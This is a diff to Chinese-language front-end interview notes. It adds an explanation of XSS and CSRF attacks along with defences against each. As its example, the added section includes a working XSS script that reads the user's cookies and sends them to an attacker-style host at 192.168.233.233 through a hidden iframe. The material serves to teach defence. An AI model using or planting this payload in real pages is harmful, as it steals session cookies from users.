@@ -98,6 +98,46 @@ __3 web安全知识__
 
 不造，去看[yacent的博客](https://www.zybuluo.com/yacent/note/448612)，发现有下面两个知识点：
 
+ XSS：跨站脚本（Cross-site scripting）
+
+CSRF：跨站请求伪造（Cross-site request forgery）
+
+XSS攻击者会在用户输入域（如评论框等）嵌入可执行脚本。这样其他用户在访问站点的时候就会执行攻击脚本，造成隐私泄露等危险。如下面的一段脚本代码：
+
+~~~javascript
+<script type="text/javascript">
+~function(window, document) {
+	var cookies = document.cookie;
+	var xssBaseURI = "http://192.168.233.233/myxss/";
+	var xssURI = xssBaseURI + window.encodeURI(cookies);
+
+	var hideFrame = document.createElement('iframe');
+	hideFrame.height = 0;
+	hideFrame.width = 0;
+	hideFrame.style.display = "none";
+	hideFrame.src = xssURI;
+
+	document.body.appendChild(hideFrame);
+
+}(window, document);
+</script>
+~~~
+
+上述脚本就会将用户的cookie信息以iframe请求方式发送到攻击者的服务器上，造成信息泄露。
+
+XSS防范措施有：
+
+- 用户输入转义
+- 白名单过滤，重新构建HTML元素树
+
+CSRF也属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户。CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作。
+
+防范措施：
+
+- 请求令牌
+- 令牌和验证码及时销毁
+- restful API设计， get，post，put，delete分别对应 获取、创建、修改，删除。
+
 __4 Promise 和 jQuery deffered__
 
 __5 哦，小伙子好像很了解ES6嘛，说一说吧！__
@@ -149,7 +189,6 @@ __3 要知道，nodeJS在4.0版本的时候已经支持ES6语法了，对此你�
 
 __4 Promise对象，它如何处理异常？__
 
-__5 __
 
 ### 总结
 
